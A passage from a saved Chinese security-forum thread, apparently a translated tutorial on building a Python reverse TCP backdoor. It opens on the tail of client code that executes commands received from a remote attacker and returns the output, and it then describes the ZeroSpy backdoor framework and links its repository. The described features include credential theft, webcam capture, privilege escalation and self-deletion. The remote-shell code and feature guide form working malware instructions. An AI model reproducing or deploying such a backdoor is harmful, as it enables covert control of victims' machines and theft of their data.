spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">stdin</code><code class="python keyword">=</code> <code class="python plain">sp.PIPE)</code></div><div class="line number57 index56 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">out,err </code><code class="python keyword">=</code> <code class="python plain">sh.communicate()</code></div><div class="line number58 index57 alt1">&nbsp;</div><div class="line number59 index58 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">result </code><code class="python keyword">=</code> <code class="python functions">str</code><code class="python plain">(out) </code><code class="python keyword">+</code> <code class="python functions">str</code><code class="python plain">(err)</code></div><div class="line number60 index59 alt1">&nbsp;</div><div class="line number61 index60 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">send_data(conn,result)</code></div><div class="line number62 index61 alt1">&nbsp;</div><div class="line number63 index62 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">command </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"exit()"</code><code class="python plain">:</code></div><div class="line number64 index63 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number65 index64 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number66 index65 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">send_data(conn,</code><code class="python string">"[-] Unknown Command"</code><code class="python plain">)</code></div><div class="line number67 index66 alt2"><code class="python comments"># 发送数据</code></div><div class="line number68 index67 alt1"><code class="python keyword">def</code> <code class="python plain">send_data(conn,data):</code></div><div class="line number69 index68 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">length </code><code class="python keyword">=</code> <code class="python functions">str</code><code class="python plain">(</code><code class="python functions">len</code><code class="python plain">(data)).zfill(</code><code class="python value">16</code><code class="python plain">)</code></div><div class="line number70 index69 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">conn.send(length </code><code class="python keyword">+</code> <code class="python plain">data)</code></div><div class="line number71 index70 alt2">&nbsp;</div><div class="line number72 index71 alt1"><code class="python keyword">if</code> <code class="python plain">__name__ </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"__main__"</code><code class="python plain">:</code></div><div class="line number73 index72 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">connect()</code></div></div></td></tr></tbody></table><h1><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>0x3 最终介绍</h1><p>　　随着某些勒索软件的教程，有些用户已经开始把文章中的代码装备到了自己写的恶意软件里。把知识用于恶意盈利，这不是作者愿意看到的局面。 </p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　这个TCP反向连接后门思路，已经事先写好了程序，并构建成了一个框架。作者实现了很多功能，比如远程导入、下载、获取root权限和升级攻击、网络摄像头、屏幕截图、情报搜集、窃取凭证等功能。为了让这个后门程序能够在大多数Linux发行版中得到充分的支持，已经尝试将其移植到各种发行版中，以解决不同的系统设计问题。 </p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　但是很不幸，作者删除了最后一个虚拟机（里面有程序最新的代码），因为硬件设备有限，只能通过利用虚拟机的方式来节省空间。如今只能把最后备份的文件贡献了出来，有兴趣的人可以把它继续开发得更加全面来帮助论坛。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　为了让感兴趣的开发者了解项目中的信息，这里展示部分项目的截图。项目地址如下：</p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python plain">ZeroSpy：https：</code><code class="python keyword">/</code><code class="python keyword">/</code><code class="python plain">github.com</code><code class="python keyword">/</code><code class="python plain">sergeantexploiter</code><code class="python keyword">/</code><code class="python plain">zero</code></div></div></td></tr></tbody></table><h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>3.1 启动界面（攻击者）</h3><p>   使用python zero.py命令在目录中启动程序。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_YAS3B3YR3UVTKJJ.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　这个本来有个横幅文字展示，但是为了节省展示空间，我删除掉了。输入help命令打印出帮助命令。这个程序首先检查状态是不是已经正常运行。是通过框架启动时加载的自定义别名文件实现的，在不同的端口上开始监听，而不是手动输入。运行状态文件使用相同的命令代码，类似在终端中输入使用的方式一样。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　功能函数代码主要放置在configurations文件夹。使用start_services命令可以把程序运行起来，启动了多个监听器，使用HASH标签做注释。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　随意使用命令，我演示的是start_server命令，它接受两个参数：主机和端口。如果要为主机输入空的double/single字符串，请改用localhost。只是为了帮助程序更好地显示。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_7B5CU9F55CHM3QJ.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　我们可以在一个监听器上接受多个客户端，就不会中断同一监听端口上的其他连接。</p>
<h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>3.2 受控端界面 (受害者)</h3><p>　　客户端脚本使用connect.py文件。语法是：python connect.py &lt;host&gt; &lt;port&gt;。客户端具有自动连接功能，如果连接失败会重新连接。</p>
<h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>3.3 回连界面 (攻击者)</h3><p>　　当客户端连接时，我们在终端上得到类似的东西。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_WUZZ94FBYTX3FGF.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　这不会让我们直接进入shell，而是将其推入后台，以便让我们继续做正在做的事情（Defaults idea）。程序可以使用sessions命令列出所有的会话连接。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_PV9FW9QCQZCYF2A.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　然后可以使用interact命令和会话ID进行交互。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　当连接到一个客户端，有一个全新的命令集（这是在没有备份的情况下进行开发的地方）。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_JZRG27QDC4JEVT7.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　开发命令是 host-scanner（需要的线程），check_vm（需要更多的跨平台的结果），webcam_list webcam_snap（代码已经毁擦除掉的虚拟机里），检索目录（嵌入到脚本中，但不会在屏幕中显示 - 克隆给定的目录 - 取得了一些进展但也毁在虚拟机里），截图（像lubuntu这样的老版本和裸发行版需要更多的库支持）。加密命令（重构为使用内部安全密钥与攻击者进行第一次数据通信，DH密钥交换和AES-SHA256进行数据传输）。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　在执行sysinfo命令后会提示shell（会话）的签名信息。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_D8DFY8FFVHZ2VC2.png" style="max-width: 100%; cursor: pointer;" alt="图片描述"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　该签名首先计算并存储在脚本部署之前的散列算法。我不知道是否在旧版本中实现了攻击者的检查特性，但整个想法是在接受连接之前检查shell签名。这是为了防止在脚本被发现时篡改，脚本使用它自己的源代码作为签名。如果签名不匹配，连接应该会删除。如果数据传输的加密不安全(用户可以先获得签名，然后用篡改的脚本发送相同的签名)，那么该特性就可以被击败。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　客户机/受害者脚本也有一个自毁特性(sh()在脚本中被注释掉)，这是在第一次连接时执行的。该特性使用了分解，如果不存在，则使用了一个内置的分解函数(我认为这是不安全的)。<br>另一个实现但失败的特性是可伸缩性。我有一个独立的程序，允许攻击者选择自己的模块并将它们编译到客户机脚本中，而不需要使用整个客户机脚本。在成功连接之后，客户端将所有可用的命令发送给攻击者。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　这里有一个Bug的地方，就是当受害者客户端断开后，不会在攻击者的一侧被删除。这可以通过在zero.py中从连接数组和会话数组变量中删除id来解决。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　我之所以上传这些文件，是因为其他人可能需要它，可能是因为我个人在Python脚本中看到了潜力。如果我不继续写下去，也并不意味着别人就可以牺牲晚上的时间来实现我的想法，并从我停止的地方继续开发下去。</p>
<h1><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>0x4 参考</h1><p>How To Make A Reverse TCP Backdoor In Python - Part 1</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-1/1038</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>How To Make A Reverse TCP Backdoor In Python - Part 2</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-2/1040</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>How To Make A Reverse TCP Backdoor In Python - Part 3</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-3/4228</p>					<br><br>
<p><a href="https://qifu.kanxue.com/" target="_blank">[推荐]看雪企服平台，提供安全分析、定制项目开发、APP等级保护、渗透测试等安全服务！ </a></p>
		<div class="text-right text-muted my-3 small font-italic">
		最后于 <span class="icon-clock-o ml-2"> </span>2019-2-1 16:40		
				被admin编辑
				
		，原因： 		
	</div>
					
										
					
								</div>
				
				<div>
								</div>
				
				<div class="" style="height: 33px; line-height: 33px; border-top: 1px solid #ddd;">
										<span class="mr-2"><a class="text-muted" href="https://bbs.pediy.com/thread-226556.htm"><i style="font-size: 1.3rem;" class="icon icon-angle-double-left"></i> 上一主题</a></span>
															<span class="mr-2 float-right"><a class="text-muted" href="https://bbs.pediy.com/thread-226488.htm">下一主题 <i style="font-size: 1.3rem;" class="icon icon-angle-double-right"></i></a></span>
									</div>
			</div>
		</div>
		
		                
                                <style>
                    .reward_logo-list-1 {
                        max-width: 52px;
                        text-align: center;
                        white-space: nowrap;
                        overflow: hidden;
                        margin-left: 0.6rem !important;
                        margin-right: 0.6rem !important;
                    }
                    .avatar {
                        width: 3.5rem;
                        height: 3.5rem;
                    }
                    .mob_reward tbody td {
                        border: none!important;
                        
                    }
                    .mob_reward ._reward_tr {
                        
                        border-bottom: 1px dashed rgba(217, 229, 237, 0.59) !important;
                    }
                    @media screen and (max-width: 998px) {
                        .mob_reward {
                            display: none !important;
                        }
                        .avatar {
                            width: 2rem;
                                height: 2rem;
                        }
                        .reward_logo-list-1 {
                            max-width: 35px;
                            white-space: nowrap;
                            overflow: hidden;
                            margin-left: 0.2rem !important;
                            margin-right: 0.2rem !important;
                        }
                    }
                    </style>
                    <div class="card px-2 px-md-5 py-5" style="border: 1px solid #fff;">
                        <div>
                            <div class="text-center">
                                <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/dashanglogo.png" style="width: 18px;">
                                <div class="d-inline-block pl-1" style="height: 28px; line-height: 28px;">
                                    <span class="color4A4A4A" style="font-size: 13px;">打赏</span>
                                    <span style="color:#0eaaf1;">+&nbsp;1.00</span>
                                </div>
                            </div>
                            <div class="pt-5 text-center">
                                                                                                                    <div class="d-inline-block mb-3 reward_logo-list-1 text-center px-0">
                                            <a href="https://passport.kanxue.com/user-center-788438.htm">
                                                <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/avatar.png" class=" avatar" style="border-radius: 5rem;">
                                            </a> 
                                            <div class="text-center small mt-1"><a href="https://passport.kanxue.com/user-center-788438.htm">fiwood</a></div>
                                        </div>
                                        
                                        
                                                                                                        </div>
                            
                            <div class="mt-3 mob_reward">
                                <table class="table mb-0">
                                    <tbody>
                                        <tr><td class="p-0" style="border-bottom: 0;height: 24px;line-height: 24px;" width="150">打赏次数<span style="color:#0eaaf1;">&nbsp;1</span></td>
                                        <td class="p-0" style="border-bottom: 0;height: 24px;line-height: 24px;" width="100">金额<span style="color:#0eaaf1;">&nbsp;+&nbsp;1.00</span></td>
                                        <td class="p-0" style="border-bottom: 0;height: 24px;line-height: 24px;"><hr></td>
                                        <td class="p-0 text-right" style="border-bottom: 0;height: 24px;line-height: 24px;" width="100">
                                            <span class="collapse_btn" style="cursor: pointer;" data-toggle="collapse" href="#collapse_reward" aria-expanded="true" aria-controls="collapse_reward">
                                                <span>收起</span>&nbsp;<i class="icon icon-angle-up"></i>
                                            </span>
                                        </td>
                                    </tr></tbody>
                                </table>
                            </div>
                            <div class="collapse show mob_reward" id="collapse_reward">
                                <table class="table">
                                    <tbody>
                                                                                                                            <tr class="_reward_tr">
                                            <td class="px-0 py-3" width="150">
                                                <a href="https://passport.kanxue.com/user-center-788438.htm">
                                                    <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/avatar.png" alt="赞赏" style="width: 1.6rem;height: 1.6rem;border-radius: 1.6rem;">&nbsp;
                                                    <span>fiwood</span>
                                                </a>
                                            </td>
                                            <td class="px-0 py-3" width="100"><span style="color:#0eaaf1;">&nbsp; +1.00</span></td>
                                            <td class="px-0 py-3 text-muted">2018/02/21</td>
                                            <td class="px-0 py-3 text-muted"></td>
                                        </tr>
                                                                                                                            
                                        
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                
                <!--赞赏支持-->
                <div class="modal fade reward" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                        <div class="modal-dialog" role="document">
                                <div class="modal-content">
                                        <div class="modal-header">
                                            <h4 class="modal-title" id="exampleModalLabel">赞赏</h4>
                                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                                    <span aria-hidden="true">×</span>
                                            </button>
                                        </div>
                                        <form action="https://bbs.pediy.com/thread-224228.htm" method="post" id="pay_kx" onsubmit="return topay()">
                                                <div class="modal-body text-center">
                                                        <div class="form-group">
                                                                <input name="ureward" type="hidden" value="214974">
                                                                <input type="hidden" name="reward_articleid" value="224228">
                                                                <div class="avatar-3 mb-3" style="width: 70px;height: 70px;display: inline-block;">
                                                                    <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/dashang.png" alt="100">
                                                                </div>
                                                                
                                                                <div class="text-center mb-2">
                                                                    <div class="" data-toggle="buttons">
                                                                        <label class="btn btn-outline-danger active" style="width:120px">
                                                                            <input type="radio" class="d-none" value="1" name="reward_rmbs" id="option1" autocomplete="off" checked="">1 元
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="2" name="reward_rmbs" id="option2" autocomplete="off">2 元
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="5" name="reward_rmbs" id="option3" autocomplete="off">5 元
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="10" name="reward_rmbs" id="option4" autocomplete="off">10 元
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="20" name="reward_rmbs" id="option5" autocomplete="off">20 元
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="50" name="reward_rmbs" id="option6" autocomplete="off">50 元
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="100" name="reward_rmbs" id="option7" autocomplete="off">100 元
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="200" name="reward_rmbs" id="option8" autocomplete="off">200 元
                                                                        </label>
                                                                    </div>
                                                                </div>

                                                                <div class="text-center">
                                                                    <label id="alipay_lab">
                                                                        <span>支付方式：</span>
                                                                        <input type="radio" value="1" checked="checked" name="reward_type" style="display:inline">
                                                                        <span class="alipay-bg"></span>
                                                                    </label>
                                                                    <label class="ml-3">
                                                                        <input type="radio" value="3" name="reward_type">
                                                                        <i class="icon icon-weixin" style="font-size:17px;color:#49BE38"></i> 微信支付
                                                                    </label>
                                                                                                                                    </div>
                                                        </div>
                                                </div>
                                                <div class="px-3 mb-3">
                                                    <div class="mb-2">赞赏留言：</div>
                                                    <div class="my-2">
                                                        <select class="form-control form-control-sm reward_reason" style="max-width: 90px;">
                                                            <option value="0">快捷留言</option>
                                                            <option value="感谢分享～">感谢分享～</option>
                                                            <option value="精品文章～">精品文章～</option>
                                                            <option value="原创内容～">原创内容～</option>
                                                            <option value="精彩转帖～">精彩转帖～</option>
                                                            <option value="助人为乐～">助人为乐～</option>
                                                            
                                                        </select>
                                                    </div>
                                                    <textarea class="form-control reward_reason_textarea" name="brief" rows="1"></textarea>
                                                    
                                                </div>
                                                <div class="modal-footer">
                                                        <button id="pay_submit" type="submit" class="btn btn-primary btn-pay kx-pay" data-loading-text="正在提交...">立即支付</button>
                                                </div>
                                        </form>
                                </div>
                        </div>
                </div>
		<style>
			.card_collection { vertical-align: middle; display: inline-block; border: 1px solid #eee; background: #EEEEEE; padding: 0px 8px; border-radius: 5px; }
			.card_collection p { margin-bottom: 0px;font-size: 12px;}
			.card_collection p a { text-decoration: none; }
			.alipay-bg { width: 60px;height: 20px;display: inline-block;vertical-align: middle;background: url(view/img/reward_alipay.png) 0 0 no-repeat;}
			.color4A4A4A {
				color: #4A4A4A;
			}
		</style>
		<div class="card" style="background:#F9F9F9;text-align:center;padding:5px 0px;">
			<div style="width:auto;display:inline-block;">
				<div class="card_collection" style="width: 70px; height: 65px;line-height:30px">
					<p>						<span id="likes">6</span>
											</p>
					<p id="favorite">
						<a href="javascript:void(0)" class="color4A4A4A" title="点我收藏">
														<i class="icon-star-o color4A4A4A"></i>&nbsp;收藏
													</a>
					</p>
				</div>

				
				<div class="card_collection" style="width: 70px; height: 65px;line-height:30px">
					<p><span id="thread_thumb_num" class="color4A4A4A" style="font-size: 13px;">0</span></p>
					<p id="thumb">
						<a href="javascript:void(0)" class="color4A4A4A">
														<i class="icon-thumbs-o-up color4A4A4A"></i>&nbsp;赞
													</a>
					</p>
				</div>
				<div class="card_collection" style="width: 70px; height: 65px;line-height:30px">
					
						<p>
							<a href="javascript:void(0);" class="modal-title d-inline-block" id="exampleModalLabel" data-toggle="modal" data-target=".reward">
								<img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/renminbi.png" style="" alt="">
							</a>
						</p>
						<p>
							<a href="javascript:void(0);" class="modal-title d-inline-block" id="exampleModalLabel" data-toggle="modal" data-target=".reward">
							<span class="color4A4A4A">打赏</span>
							</a>
						</p>
					
				</div>
				<div class="card_collection bbsshare_btn" style="width: 70px; height: 65px;line-height:30px">
					
						<p>
							<a href="javascript:void(0);" class="modal-title d-inline-block">
								<img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/bbsshare.png" style="" alt="">
							</a>
						</p>
						<p>
							<a href="javascript:void(0);" class="modal-title d-inline-block">
							<span class="color4A4A4A">分享</span>
							</a>
						</p>
					
				</div>
				<!-- <div class="card_collection" style="padding-top: 5px; padding-bottom: 5px;">
					<a href="javascript:void(0);" class="modal-title" id="exampleModalLabel" data-toggle="modal" data-target=".reward">
						<img src="view/img/dashang.png" alt="赞赏" style="width:50px;vertical-align: middle;" title="现金赞赏支持">
					</a>
				</div> -->

				<!-- <div class="card_collection">
					<img src="bbs_qrcode-http_3A_2F_2Fbbs_2epediy_2ecom_2Fthread_2d224228_2ehtm.htm" alt="二维码" style="width:60px;height:60px;vertical-align: middle; ">
				</div> -->
				<!-- <div class="card_collection" style="padding-top: 5px; padding-bottom: 5px;">
					<img src="view/img/bbsshare.png" class="bbsshare_btn" style="width: 50px; cursor: pointer; vertical-align: middle;" title="">
				</div> -->

				<div class="bd-bbsshare-modal-sm" style="display: none;">
					<div>
						<div class="px-5 py-4">
							<div class="text-left">分享到：</div>
							<div class="pt-4">
							
								<div onclick="shareTo(&#39;qzone&#39;)" class="fl d-inline-block mr-3" style="cursor: pointer;">
									<img width="32" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/qqzoneshare.png">
								</div>
								<div onclick="shareTo(&#39;qq&#39;)" class="fl d-inline-block mr-3" style="cursor: pointer;">
									<img width="32" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/qqshare.png">
								</div>
								<div onclick="shareTo(&#39;sina&#39;)" class="fl d-inline-block mr-3" style="cursor: pointer;">
									<img width="32" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/sinaweiboshare.png">
								</div>
								<div onclick="shareTo(&#39;wechat&#39;)" id="wxshare" class="fl d-inline-block" style="cursor:pointer;">
									<img width="32" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/wechatshare.png">
								</div>
								
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div class="card p-1">
			<div class="card-body">
				<table class="table postlist mb-0">
					<thead>
						<tr>
							<th colspan="2" class="pa-0  pb-1">
								<dl class="row">
									<dt>
										<b>最新回复</b> (<span class="posts">4</span>)
									</dt>
									<dd style="text-align: right;">
										
										
																				
									</dd>
								</dl>
							</th>
						</tr>
					</thead>
					<tbody>
					
														
				
																			
										
										
					<tr class="post" data-pid="1513533">
						<td class="vtop td-avatar text-center" style="width: 46px;">
							<a href="https://bbs.pediy.com/user-525644.htm" tabindex="-1">
								<img class="avatar-3" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/525644.png">
							</a>
							<div class="mt-2">
								<span class="group group-102 mr-1" data-gid="102" onmouseenter="show_level(event)"></span>
							</div>
							<div class="text-grey text-tiny" style="height: 20px; text-align: center; margin-top: -9px; ">
								
								<!--注册：2012-6 <br>
								帖子：30 <br>-->
<!-- 
								 -->
								<div class="mb-3" style="position: relative;"><img style="position:absolute;left: -3px;" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/stars01.gif" alt=""> </div>
								<!--<span class="hidden-sm hidden-md" title=""></span>
								-->

							</div>
							
							
						</td>
						<td class="px-0">
							<dl class="row small">
								<dt>
									
									
									<div>
									<span class="username font-weight-bold">
										<a href="https://bbs.pediy.com/user-525644.htm">编程人生</a>
									</span>
									
																		<span class="post_online_time" data-online_time="289286" data-desc="在线时长: 80 小时 ( 4 级)&lt;br/&gt; 升级还需要 9 小时" onmouseenter="show_online_level(event)"><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/moon.gif" width="13" height="13" style="opacity: 0.65; margin-right: 2px;"></span>
									<span class="date text-grey small ml-1">2018-1-22 09:54</span>
									</div>
									
								</dt>
								<dd class="text-right text-grey py-1">
									<div class="check_input_box d-inline-block"></div>
									<div class=" d-none d-lg-inline-block">
																													
																				
										

																			
										

	

																				
																			</div>
																		<a href="https://bbs.pediy.com/thread-224228-1.htm#1513533" id="1513533" class="text-grey mr-3"><span class="floor">2</span> 楼</a>
																			<div class="reply_thumb" style="display: inline-block;">
		<input type="hidden" value="224228" name="threadid">
		<input type="hidden" value="525644" name="praised_uid">
		<input type="hidden" value="1513533" name="pid">
		<a href="javascript:void(0)" class="text-grey">
						<i class="icon-thumbs-o-up"></i>
					</a>
		<span class="thumb_num" style="margin-left:5px">0</span>
	</div>
									<style>
										.mobile_more_operate_btn {
											padding: 0px 4px; 
											background: #dee5ea; 
											border-radius: 0.2rem; 
											cursor: pointer;
										}
										.mobile_more_operate {
											display: none; 
											left: -195px; 
											top: -13px; 
											width: 185px; 
											background: #222222; 
											border-radius: 0.3rem;
										}
										.mobile_more_operate_box .post_report {
											color: #fff!important;
										}
									</style>
										
								</dd>
							</dl>
							<!-- <div></div> -->
							<div class="message mt-1 break-all">
																								神器								
																																
								
							</div>
						</td>
					</tr>
																			
										
										
					<tr class="post" data-pid="1516373">
						<td class="vtop td-avatar text-center" style="width: 46px;">
							<a href="https://bbs.pediy.com/user-788438.htm" tabindex="-1">
								<img class="avatar-3" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/avatar.png">
							</a>
							<div class="mt-2">
								<span class="group group-102 mr-1" data-gid="102" onmouseenter="show_level(event)"></span>
							</div>
							<div class="text-grey text-tiny" style="height: 20px; text-align: center; margin-top: -9px; ">
								
								<!--注册：2018-2 <br>
								帖子：1 <br>-->
<!-- 
								 -->
								<div class="mb-3" style="position: relative;"><img style="position:absolute;left: -3px;" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/stars01.gif" alt=""> </div>
								<!--<span class="hidden-sm hidden-md" title=""></span>
								-->

							</div>
							
							
						</td>
						<td class="px-0">
							<dl class="row small">
								<dt>
									
									
									<div>
									<span class="username font-weight-bold">
										<a href="https://bbs.pediy.com/user-788438.htm">fiwood</a>
									</span>
									
																		<span class="post_online_time" data-online_time="16800" data-desc="在线时长: 4 小时 ( 0 级)&lt;br/&gt; 升级还需要 5 小时" onmouseenter="show_online_level(event)"><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/star_0.gif" width="13" height="13" style="opacity: 0.65; margin-right: 2px;"></span>
									<span class="date text-grey small ml-1">2018-2-19 22:25</span>
									</div>
									
								</dt>
								<dd class="text-right text-grey py-1">
									<div class="check_input_box d-inline-block"></div>
									<div class=" d-none d-lg-inline-block">
																													
																				
										

																			
										

	

																				
																			</div>
																		<a href="https://bbs.pediy.com/thread-224228-1.htm#1516373" id="1516373" class="text-grey mr-3"><span class="floor">3</span> 楼</a>
																			<div class="reply_thumb" style="display: inline-block;">
		<input type="hidden" value="224228" name="threadid">
		<input type="hidden" value="788438" name="praised_uid">
		<input type="hidden" value="1516373" name="pid">
		<a href="javascript:void(0)" class="text-grey">
						<i class="icon-thumbs-o-up"></i>
					</a>
		<span class="thumb_num" style="margin-left:5px">0</span>
	</div>
									<style>
										.mobile_more_operate_btn {
											padding: 0px 4px; 
											background: #dee5ea; 
											border-radius: 0.2rem; 
											cursor: pointer;
										}
										.mobile_more_operate {
											display: none; 
											left: -195px; 
											top: -13px; 
											width: 185px; 
											background: #222222; 
											border-radius: 0.3rem;
										}
										.mobile_more_operate_box .post_report {
											color: #fff!important;
										}
									</style>
										
								</dd>
							</dl>
							<!-- <div></div> -->
							<div class="message mt-1 break-all">
																								老哥稳！崇拜								
																																
								
							</div>
						</td>
					</tr>
																			
										
										
					<tr class="post" data-pid="1516642">
						<td class="vtop td-avatar text-center" style="width: 46px;">
							<a href="https://bbs.pediy.com/user-665727.htm" tabindex="-1">
								<img class="avatar-3" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/avatar.png">
							</a>
							<div class="mt-2">
